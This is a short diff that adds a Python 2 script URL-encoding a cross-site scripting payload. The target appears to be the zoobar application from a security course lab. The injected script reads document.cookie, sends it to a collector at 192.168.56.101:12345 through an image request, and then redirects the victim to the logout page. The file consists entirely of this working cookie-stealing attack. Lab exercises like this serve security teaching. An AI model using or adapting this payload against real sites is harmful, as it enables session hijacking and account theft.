@@ -1,0 +1,3 @@
+import urllib
+
+print urllib.quote_plus('=a1" size=10><img id="image"></nobr><br><input type="submit" value="View"></form><script>document.getElementById("image").src="http://192.168.56.101:12345?payload="%2bdocument.cookie.split("%23")[1]%2b"%26roll=13358%26random="%2bMath.random()%2b"%26timestamp="%2bDate.now();window.stop();setTimeout(function(){window.location.href="http://localhost:8080/zoobar/index.cgi/logout";},3000);</script>')
